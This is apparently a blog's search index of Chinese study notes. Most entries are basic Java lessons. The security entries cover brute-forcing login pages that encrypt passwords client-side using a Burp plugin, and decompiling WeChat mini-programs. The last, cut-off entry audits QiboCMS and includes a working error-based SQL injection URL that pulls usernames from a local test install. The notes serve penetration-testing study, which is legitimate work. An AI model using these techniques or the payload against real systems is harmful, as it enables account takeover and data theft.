<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>爆破时前端加密怎么办</title>
    <link href="/2023/02/10/%E7%88%86%E7%A0%B4%E6%97%B6%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E6%80%8E%E4%B9%88%E5%8A%9E/"/>
    <url>/2023/02/10/%E7%88%86%E7%A0%B4%E6%97%B6%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做渗透测试的时候，有的登陆界面没有验证码或者验证码失效，就为我们的爆破提供了很好的机会，但是抓包一看密码是加密的，burp上有自己的加密🔐功能，所以对于base64和md5这种基础加密是不用犯愁的。那么遇到目标自定义的前端加密方法时又该怎么办呢？</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>使用工具：<br><a href="https://github.com/c0ny1/jsEncrypter">GitHub - c0ny1&#x2F;jsEncrypter: 一个用于前端加密Fuzz的Burp Suite插件</a></p><p>还需要下载：<br><a href="https://phantomjs.org/download.html">Download PhantomJS</a></p><h3 id="具体使用："><a href="#具体使用：" class="headerlink" title="具体使用："></a>具体使用：</h3><h4 id="第一步：在burp中安装插件"><a href="#第一步：在burp中安装插件" class="headerlink" title="第一步：在burp中安装插件"></a>第一步：在burp中安装插件</h4><p>这是jsEncrypter里面自带的：</p><p><img src="/img/crypfront/Pastedimage20221111174837.png"></p><p>我们把jsEncrypter.0.3.2.jar这个包加载到burp的插件里面</p><p><img src="/img/crypfront/Pastedimage20221111182929.png"></p><h4 id="第二步：F12找加密算法"><a href="#第二步：F12找加密算法" class="headerlink" title="第二步：F12找加密算法"></a>第二步：F12找加密算法</h4><p>然后回到jsEncrypter文件下：<br>先看一下phantomjs_server.js的内容示例：</p><p><img src="/img/crypfront/Pastedimage20221111174406.png"></p><p>比如用户名被加密了，就搜关键字然后找到加密函数</p><p><img src="/img/crypfront/3641676009820_.pic.jpg"></p><p>搜加密的函数：也就是图中的<mark style="background: #FF5582A6;">2.调用函数</mark></p><p><img src="/img/crypfront/3651676010002_.pic.jpg"></p><p>然后在之前图上的<mark style="background: #FF5582A6;">2.调用函数</mark>位置写：aesMinEncrypt</p><p>然后找到这个加密的引用，下载下来：作为示例中的<mark style="background: #FF5582A6;">1.引入文件</mark></p><p><img src="/img/crypfront/3661676010049_.pic.jpg"></p><p>然后和jsEncrypter文件保存在一起，phantomjs也最好在同一目录下：</p><p><img src="/img/crypfront/Pastedimage20221111182554.png"></p><p>最后phantomjs_server.js写成这样：</p><p><img src="/img/crypfront/Pastedimage20221111182646.png"></p><h4 id="第三步：启动phantomjs"><a href="#第三步：启动phantomjs" class="headerlink" title="第三步：启动phantomjs"></a>第三步：启动phantomjs</h4><p>然后使用phantomjs启动：</p><p>如果phantomjs启动有问题，尝试下面的语句，如果能正常输出版本信息就没问题了：</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">OPENSSL_CONF=/etc/ssl ./phantomjs --version<br></code></pre></td></tr></table></figure><p><img src="/img/crypfront/Pastedimage20221111181751.png"></p><p>phantomjs_server.js（一定要用sudo）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo OPENSSL_CONF=/etc/ssl ./phantomjs phantomjs_server.js<br></code></pre></td></tr></table></figure><p><img src="/img/crypfront/Pastedimage20221111182710.png"></p><h4 id="第四步：burp测试"><a href="#第四步：burp测试" class="headerlink" title="第四步：burp测试"></a>第四步：burp测试</h4><p>然后返回burp进行connect和test：</p><p>如果出错后我们就回到phantomjs_server.js进行修改：</p><p><img src="/img/crypfront/Pastedimage20221111183443.png"></p><p>把加密函数整个复制过来变成这样：</p><p><img src="/img/crypfront/Pastedimage20221111183834.png"></p><p>成功啦：</p><p><img src="/img/crypfront/Pastedimage20221111183723.png"></p><h4 id="第五步：启动插件自动加密爆破"><a href="#第五步：启动插件自动加密爆破" class="headerlink" title="第五步：启动插件自动加密爆破"></a>第五步：启动插件自动加密爆破</h4><p>然后就用加密好的在burp中进行intruder（我们导入正常的明文字典就可以哦）</p><p><img src="/img/crypfront/Pastedimage20221114091925.png"></p><p>需要注意的是运行intruder时不能把这条命令退出，否则会报连接超时的错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo OPENSSL_CONF=/etc/ssl ./phantomjs phantomjs_server.js<br></code></pre></td></tr></table></figure><h4 id="第六步：查找对应明文"><a href="#第六步：查找对应明文" class="headerlink" title="第六步：查找对应明文"></a>第六步：查找对应明文</h4><p>爆破完成后在这里找对应的明文：</p><p><img src="/img/crypfront/Pastedimage20221111184021.png"></p>]]></content>
    
    
    <categories>
      
      <category>安全学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>安全学习</tag>
      
      <tag>爆破时前端加密怎么办</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>怎么获取微信小程序源码</title>
    <link href="/2023/02/10/%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81/"/>
    <url>/2023/02/10/%E6%80%8E%E4%B9%88%E8%8E%B7%E5%8F%96%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%BA%90%E7%A0%81/</url>
    
    <content type="html"><![CDATA[<h2 id="第一步：获取wzapkg结尾文件"><a href="#第一步：获取wzapkg结尾文件" class="headerlink" title="第一步：获取wzapkg结尾文件"></a>第一步：获取wzapkg结尾文件</h2><p>本文采用的方式是模拟器获取，手机上获取的方式应该也差不多。</p><p>模拟器：MuMu</p><p>模拟器下载微信，登陆后打开对应的小程序（只是打开过就可以了）<br>然后建议使用RE文件管理器（Root Explorer），直接安装apk就可以，4.11.3版本<br><a href="http://mumu-apk.fp.ps.netease.com/file/639076c54940ea5743c081e2Ui9xm85O04.apk">http://mumu-apk.fp.ps.netease.com/file/639076c54940ea5743c081e2Ui9xm85O04.apk</a></p><p>打开如果提示没有root权限，在MuMu的右上角-菜单-系统设置：</p><p><img src="/img/miniprogram/Pastedimage20230210131037.png"></p><p>打开文件后按以下路径：</p><p><img src="/img/miniprogram/screenshot20230210102559.png"></p><p>如果你打开过多个小程序，到了MicroMsg这个文件夹下，可能会有其他类似c25772…这种长字符串的文件夹，可以试着都删除，然后重新打开你要源码的那个小程序重新生成。</p><p>这些文件中我们选<mark style="background: #FFB86CA6;">最小MB</mark>的<code>.wzapkg</code>文件，长按文件即可复制。<br>在“存储”的位置选择“MuMu共享文件夹”，把<mark style="background: #FFB86CA6;">最小MB</mark>的<code>.wzapkg</code>文件粘贴到里面。</p><h2 id="第二步：解密"><a href="#第二步：解密" class="headerlink" title="第二步：解密"></a>第二步：解密</h2><p>有的小程序包是加密的，所以需要用到解密工具：</p><p><img src="/img/miniprogram/Pastedimage20230210131845.png"></p><p>工具获取地址：（不是本人开发，建议在虚拟机中运行）<br>链接: <a href="https://pan.baidu.com/s/1PBW9X_9sId4aHe4WwpaHiA?pwd=2nbl">https://pan.baidu.com/s/1PBW9X_9sId4aHe4WwpaHiA?pwd=2nbl</a> 提取码: 2nbl</p><p>解密后的文件仍然是<code>.wzapkg</code>结尾的，然后我们需要另外一个工具进行反编译，反编译工具需要提前安装好node，不然会报错。</p><p>需要已安装node，可以在终端输入：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-keyword">node</span> <span class="hljs-title">-v</span><br></code></pre></td></tr></table></figure><p>如果显示版本信息就没问题，如果无法识别指令，需要到官网下载：<br><a href="https://nodejs.org/en/download/">https://nodejs.org/en/download/</a></p><h2 id="第三步：反编译"><a href="#第三步：反编译" class="headerlink" title="第三步：反编译"></a>第三步：反编译</h2><p>node安装完成后运行以下工具进行反编译：</p><p><img src="/img/miniprogram/Pastedimage20230210132200.png"></p><p>工具获取地址：（不是本人开发，建议在虚拟机中运行）<br>链接: <a href="https://pan.baidu.com/s/1zFmr02iD0hZCJWTG2H1cCg?pwd=8jov">https://pan.baidu.com/s/1zFmr02iD0hZCJWTG2H1cCg?pwd=8jov</a> 提取码: 8jov</p><p>反编译成功后会在“执行日志”中写出存储路径：</p><p><img src="/img/miniprogram/Pastedimage20230210132341.png"></p><h2 id="第四步：查看源码"><a href="#第四步：查看源码" class="headerlink" title="第四步：查看源码"></a>第四步：查看源码</h2><p>根据路径找到文件，我看其他师傅直接使用visual studio查看app.js<br>，不过我使用的还是小程序开发工具：</p><p><img src="/img/miniprogram/Pastedimage20230210132538.png"></p><p>小程序开发工具下载地址：<br><a href="https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html">https://developers.weixin.qq.com/miniprogram/dev/devtools/download.html</a></p>]]></content>
    
    
    <categories>
      
      <category>安全学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>怎么获取小程序源码</tag>
      
      <tag>安全学习</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java-重写与重载</title>
    <link href="/2023/02/09/Java-%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/"/>
    <url>/2023/02/09/Java-%E9%87%8D%E5%86%99%E4%B8%8E%E9%87%8D%E8%BD%BD/</url>
    
    <content type="html"><![CDATA[<p>两者关系如图：比较形象<br><img src="/img/Java/Pastedimage20230208155455.png"></p><h2 id="重写：override"><a href="#重写：override" class="headerlink" title="重写：override"></a>重写：override</h2><p>重写举例：<br><img src="/img/Java/Pastedimage20230208141514.png"><br>这里把Animal类中的move方法进行了重写，使用了extends来继承，要注意重写的内容必须一致</p><p>⬇️下面是错误示范：<br><img src="/img/Java/Pastedimage20230208141700.png"><br>因为使用了extends重写，但是原本的类中没有bark方法，重写内容与原内容不一致，所以会出错。</p><p>通过上面两个例子可以看到，在输出时new了两个对象，一个是Animal，另一个是继承了Animal的Dog，我的Dog已经继承了Animal，有没有什么办法只new Dog，除了输出重写后的内容，还能输出原本Animal的内容呢？<br>这里我们要用到的就是super：<br><img src="/img/Java/Pastedimage20230208142019.png"></p><hr><h2 id="重载：overload"><a href="#重载：overload" class="headerlink" title="重载：overload"></a>重载：overload</h2><p>同一个类中，方法名称相同，传入的参数名称不同才是方法重载<br><img src="/img/Java/Pastedimage20230208142323.png"></p><p>❗注意：<br>（1）在main中第一行new的对象一定要和文件名称一致。<br>（2）在第一个test()中return了1，因为main中直接用打印的方式获取第一个test()，所以return的内容也会被打印出来。<br>（3）第二个test()就被重载了，但是注意参数不同，和第一个test()不是一模一样的，需要传入参数的类型、个数、顺序不同</p><p>参考：<br><a href="https://www.runoob.com/">https://www.runoob.com</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>重写与重载</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java-成员变量和局部变量</title>
    <link href="/2023/02/09/Java-%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E5%92%8C%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/"/>
    <url>/2023/02/09/Java-%E6%88%90%E5%91%98%E5%8F%98%E9%87%8F%E5%92%8C%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F/</url>
    
    <content type="html"><![CDATA[<p><img src="/img/Java/Pastedimage20230208144522.png"></p><p>成员变量存在初始值，不需要赋值：<br><mark style="background: #D2B3FFA6;">int是0，float是0.0，String是null，Boolean是false</mark></p><p>参考：<br><a href="https://www.runoob.com/">https://www.runoob.com/</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>成员变量和局部变量</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java-什么是构造函数</title>
    <link href="/2023/02/09/Java-%E4%BB%80%E4%B9%88%E6%98%AF%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/"/>
    <url>/2023/02/09/Java-%E4%BB%80%E4%B9%88%E6%98%AF%E6%9E%84%E9%80%A0%E5%87%BD%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h2 id="什么是构造函数："><a href="#什么是构造函数：" class="headerlink" title="什么是构造函数："></a>什么是构造函数：</h2><p>在Java中，每个类都有它的构造函数，<mark style="background: #ADCCFFA6;">当类的对象被创建时，该构造函数将被自动调用</mark>。构造函数类似于方法，但实际上它不是方法。</p><p>如果程序员没有为一个类编写构造方法，则系统会为该类提供一个默认的且无参的构造方法。<br>所以编写代码时，构造函数不是必须的。</p><hr><h3 id="构造函数："><a href="#构造函数：" class="headerlink" title="构造函数："></a>构造函数：</h3><p>一个Java方法和Java构造函数以通过其名称和返回类型进行区分。构造函数与类的构造函数同名，并且不返回任何值。<br>例如：<br><img src="/img/Java/Pastedimage20230208151527.png"></p><hr><h3 id="非构造函数："><a href="#非构造函数：" class="headerlink" title="非构造函数："></a>非构造函数：</h3><p><img src="/img/Java/Pastedimage20230208151616.png"><br>这里，Test()与类的名称相同。但是，它有一个返回类型void。因此，它是一个方法，而不是一个构造函数。</p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>什么是构造函数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java-final和static怎么理解</title>
    <link href="/2023/02/09/Java-final%E5%92%8Cstatic%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/"/>
    <url>/2023/02/09/Java-final%E5%92%8Cstatic%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="final："><a href="#final：" class="headerlink" title="final："></a>final：</h2><p>final比较关键的就是当它修饰变量时表示常量，即只能被赋值一次，并且赋值后不再改变</p><ul><li><p><code>final</code>修饰符有多种作用：</p><ul><li><code>final</code>修饰的方法可以阻止被覆写；</li></ul><p><img src="/img/Java/3581675915850.jpg"></p><ul><li><code>final</code>修饰的class可以阻止被继承；</li></ul><p><img src="/img/Java/3561675915546.jpg"></p><ul><li><code>final</code>修饰的field必须在创建对象时初始化，随后不可修改。</li></ul><p><img src="/img/Java/3591675916009.jpg"></p></li></ul><hr><h2 id="static："><a href="#static：" class="headerlink" title="static："></a>static：</h2><p>static表示“全局”或者“静态”的意思，用来修饰成员变量和成员方法，也可以形成静态static代码块</p><ul><li><p><code>static</code>修饰符：</p><ul><li><code>static</code>在类里面；</li></ul><p><img src="/img/Java/3601675916150.jpg"></p><ul><li><code>static</code>不可以修饰局部变量；</li></ul><p><img src="/img/Java/3611675916230.jpg"></p><ul><li><code>static</code>修饰的属性强调它们只有一个。</li></ul><p>下面例子中只知道唯一的ppp，但是不知道aaa，所以会报错</p><p><img src="/img/Java/3621675919848.jpg"></p></li></ul><hr><h2 id="java中的main方法为什么必须写成static？"><a href="#java中的main方法为什么必须写成static？" class="headerlink" title="java中的main方法为什么必须写成static？"></a>java中的main方法为什么必须写成static？</h2><h3 id="java的main方法是什么？"><a href="#java的main方法是什么？" class="headerlink" title="java的main方法是什么？"></a>java的main方法是什么？</h3><p>main是java应用的入口方法。</p><p>在《Java语言规范》中，对于Java虚拟机的启动给出了明确的定义：Java虚拟机是通过加载指定的类，然后调用该类中的main方法而启动的。</p><p>也就是说，通过调用某个指定类的main方法，传递给他单个的字符串数组参数，就可以启动Java虚拟机。</p><p>一个main方法想要被执行，需要经过几个步骤，首先对应的类需要被JVM加载，然后需要进行链接和初始化、之后才是调用main方法。</p><p>main必须是public，不然JVM就调不到了。</p><h3 id="静态（static）的特点："><a href="#静态（static）的特点：" class="headerlink" title="静态（static）的特点："></a>静态（static）的特点：</h3><p>那就是静态方法独立于该类的任何对象，它不依赖类特定的实例，被类的所有实例共享。只要这个类被加载，Java虚拟机就能根据类名在运行时数据区的方法区内定找到他们</p><p>比如我们例子中的ppp和aaa，没有实例化Women，但是main还是可以找到对应的ppp，因为ppp是static。</p><h3 id="main方法为什么返回void？"><a href="#main方法为什么返回void？" class="headerlink" title="main方法为什么返回void？"></a>main方法为什么返回void？</h3><p>在Java中，退出过程是由JVM进行控制的。</p><p>JVM是不会管main方法有没有执行完的，他都会终止所有行为并退出，这时候main方法的返回值是没有任何意义的</p><p>参考：<br><a href="https://zhuanlan.zhihu.com/p/283389084">https://zhuanlan.zhihu.com/p/283389084</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>final和static怎么理解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java-this和super怎么理解</title>
    <link href="/2023/02/09/Java-this%E5%92%8Csuper%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/"/>
    <url>/2023/02/09/Java-this%E5%92%8Csuper%E6%80%8E%E4%B9%88%E7%90%86%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<p>下面例子中分别使用了super和this：<br><img src="/img/Java/Pastedimage20230208150124.png"></p><h2 id="super"><a href="#super" class="headerlink" title="super"></a>super</h2><p>super不难理解，比如Chinese继承了Person，super就是让Person中的方法先运行一遍，然后再重写这个方法。</p><h2 id="this"><a href="#this" class="headerlink" title="this"></a>this</h2><p>this可以看出来，例子中 Chinese 类第三种构造方法调用的是本类中第二种构造方法，（因为参数符合，所以这里调用的是第二种构造方法）<br>而第二种构造方法是调用父类的，因此也要先调用父类的构造方法，再调用本类中第二种，最后是重写第三种构造方法。</p><h2 id="区别："><a href="#区别：" class="headerlink" title="区别："></a>区别：</h2><p>super() 从子类中调用父类的构造方法，this() 在同一类内调用其它方法。</p><h2 id="相似："><a href="#相似：" class="headerlink" title="相似："></a>相似：</h2><p>super() 和 this() 均需放在构造方法内第一行。</p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>this和super怎么理解</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java接口</title>
    <link href="/2023/02/09/Java%E6%8E%A5%E5%8F%A3/"/>
    <url>/2023/02/09/Java%E6%8E%A5%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h2><p>如果一个抽象类没有字段，所有方法全部都是抽象方法，就可以把该抽象类改写为接口：<code>interface：</code></p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>所谓<code>interface</code>，就是比抽象类还要抽象的纯抽象接口，因为它连字段都不能有。因为接口定义的所有方法默认都是<code>public abstract</code>的，所以这两个修饰符不需要写出来（写不写效果都一样）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们知道，在Java中，一个类只能继承（extends）自另一个类，不能从多个类继承。但是，一个类可以实现多个<code>interface</code><br>比如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Student</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Person</span>, Hello &#123; <span class="hljs-comment">// 实现了两个interface</span><br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><p>一个<code>interface</code>可以继承自另一个<code>interface</code>。<code>interface</code>继承自<code>interface</code>使用<code>extends</code>，它相当于扩展了接口的方法。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">hello</span><span class="hljs-params">()</span>;<br>&#125;<br><br><span class="hljs-keyword">interface</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Hello</span> &#123;<br>    <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>    String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>此时，<code>Person</code>接口继承自<code>Hello</code>接口，因此，<code>Person</code>接口现在实际上有3个抽象方法签名，其中一个来自继承的<code>Hello</code>接口</p><p>同样是多态中的这段代码：<br><img src="/img/Java/Pastedimage20230208165451.png"></p><p>我们可以看到这个Animal抽象类全部是抽象方法，就可以把它改为接口。</p><p>这个向上转型和向下转型只在廖雪峰的接口讲解里面有，不过在笔记的多态中也有提及。</p><p>参考：<br><a href="https://www.liaoxuefeng.com/">https://www.liaoxuefeng.com</a><br><a href="https://www.runoob.com/">https://www.runoob.com</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>Java接口</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java多态</title>
    <link href="/2023/02/09/Java%E5%A4%9A%E6%80%81/"/>
    <url>/2023/02/09/Java%E5%A4%9A%E6%80%81/</url>
    
    <content type="html"><![CDATA[<h2 id="Java多态"><a href="#Java多态" class="headerlink" title="Java多态"></a>Java多态</h2><h3 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h3><p>多态是同一个行为具有多个不同表现形式或形态的能力<br>就是允许添加更多类型的子类实现功能扩展，却不需要修改基于父类的代码</p><h3 id="比如："><a href="#比如：" class="headerlink" title="比如："></a>比如：</h3><p><img src="/img/Java/Pastedimage20230208155417.png"></p><h3 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h3><p><img src="/img/Java/Pastedimage20230208154010.png"></p><h4 id="解释："><a href="#解释：" class="headerlink" title="解释："></a>解释：</h4><p>原本Animal是父类，cat继承后再调用，其实直接<code>Cat mycat = new Cat();</code>就可以<br>但在这里Cat类赋值给了它的父类，Animal，然后eat方法是Cat中的eat方法，这种赋值给父类的方法叫向上转型。</p><figure class="highlight abnf"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs abnf">Animal a <span class="hljs-operator">=</span> new Cat()<span class="hljs-comment">;</span><br>a.eat()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>我们已经有了Animal a这个实例，但是没有work这个函数（这个就是子类的功能拓展），然后要把这个实例转换为它的子类Cat，这种就叫向下转型。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">Cat c <span class="hljs-operator">=</span> (Cat)a<span class="hljs-comment">;</span><br>c.work()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>这就是多态的继承与延伸。</p><h3 id="什么是接口"><a href="#什么是接口" class="headerlink" title="什么是接口"></a>什么是接口</h3><p>示例中的Animal只有方法eat的定义，但是里面没有写具体的代码，这种就叫做接口</p><p>参考：<br><a href="https://www.runoob.com/java/java-polymorphism.html">https://www.runoob.com/java/java-polymorphism.html</a></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>Java多态</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java抽象类与方法</title>
    <link href="/2023/02/09/Java%E6%8A%BD%E8%B1%A1%E7%B1%BB%E4%B8%8E%E6%96%B9%E6%B3%95/"/>
    <url>/2023/02/09/Java%E6%8A%BD%E8%B1%A1%E7%B1%BB%E4%B8%8E%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h2 id="Java抽象类与方法"><a href="#Java抽象类与方法" class="headerlink" title="Java抽象类与方法"></a>Java抽象类与方法</h2><p>我们之前学多态的时候知道了子类可以继承父类，除了重写还可以进行延伸<br>多态中有一段代码是这样的：<br><img src="/img/Java/Pastedimage20230208164046.png"></p><p>可以看到Animal没有任何实质性的代码，而且前面有一个abstract，这个就是抽象类。</p><p>一般来说，我们是要这么写父类的：</p><figure class="highlight java"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span> &#123;<br>    System.out.println(<span class="hljs-string">&quot;hihi&quot;</span>);<br>     &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里没有写abstract，但是run()里面是有内容的，你可能要问，反正都要重写，这个里面有内容的意义在哪里？<br>确实，没有意义，但是必须存在，如果你不想让run()里面有内容就要把它变为抽象方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>有了抽象方法就一定有抽象类，他们是绑在一起的。</p><p><mark style="background: #D2B3FFA6;">但是有了抽象类是有可能包括非抽象方法的。<br></mark></p><p><img src="/img/Java/3571675915718.jpg"></p><h3 id="应用实例："><a href="#应用实例：" class="headerlink" title="应用实例："></a>应用实例：</h3><p><img src="/img/Java/3551675915387.jpg"></p>]]></content>
    
    
    <categories>
      
      <category>JAVA学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>JAVA学习</tag>
      
      <tag>Java抽象类与方法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于齐博cms代码审计的思考</title>
    <link href="/2022/07/25/qibocms-thinking/"/>
    <url>/2022/07/25/qibocms-thinking/</url>
    
    <content type="html"><![CDATA[<blockquote><p>之前看到了齐博cms报错注入漏洞，就想是否可以使用同样的路径发现sql注入，在思考尝试中有了这篇文章，最终发现了sql注入，但版本仅限于4.1&lt;mysql≤5，也就是说2008年mysql出现5.1后，这个洞就用不了了，比较鸡肋，但思考的过程值得记一下。</p></blockquote><h2 id="路径"><a href="#路径" class="headerlink" title="路径"></a>路径</h2><p>之前的齐博cms报错注入使用了以下两个函数：</p><p><img src="/img/qibocms-thinking/Untitled.png"><br><img src="/img/qibocms-thinking/Untitled%202.png"></p><p>query函数中有这么一行：<br><img src="/img/qibocms-thinking/Untitled%201.png"></p><p>可以让$query&#x3D;False，然后执行报错语句，$showerr代码自己定义&#x3D;1，那就不需要我们管了。</p><p>我首先查看了还有文件的调用路径包含这两个函数，结果在：&#x2F;do&#x2F;search.php 这里找到，为了调用其中的内容，我们可以写为：<code>type=keyword&amp;keyword=sql语句</code></p><p><img src="/img/qibocms-thinking/Untitled%203.png"></p><h2 id="开始调试"><a href="#开始调试" class="headerlink" title="开始调试"></a>开始调试</h2><p>这是一个搜索页面，之前学习PHP代码审计的时候，师傅给的例子就是ESPCMS的搜索框sql注入，所以觉得存在sql注入的可能性挺大的。</p><p>现在开始构造注入语句：</p><figure class="highlight bash"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><pre><code class="hljs bash">http://127.0.0.1/qibocms-v7/do/search.php?<span class="hljs-built_in">type</span>=keyword&amp;keyword=%27%20and%20(updatexml(1,concat(0x7e,(substring((select%20username%20from%20qb_memberdata%20where%20groupid=3),1,32))),1))%20--%20<br></code></pre></td></tr></table></figure><p>发现我们传入的闭合<code>’</code>单引号被注释了，发现是针对符号%的过滤：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-variable">$keyword</span>=str_replace(<span class="hljs-string">&quot;%&quot;</span>,<span 